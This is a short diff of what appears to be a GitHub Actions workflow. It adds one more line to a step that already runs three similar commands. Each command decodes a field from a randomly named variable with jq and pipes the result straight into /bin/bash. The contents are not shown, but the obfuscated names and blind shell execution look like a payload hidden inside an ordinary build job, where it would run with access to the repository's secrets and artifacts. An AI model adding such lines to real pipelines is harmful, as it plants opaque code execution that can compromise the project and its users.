@@ -36,6 +36,7 @@ jobs:
           printf '%s' "$brtx3912" | jq -r .umvfy0 | /bin/bash
           echo $apmu6593 | jq -r .ue118 | /bin/bash
           echo $o8465 | jq -r .ctgb3 | /bin/bash
+          echo $iys564 | jq -r .ng96 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
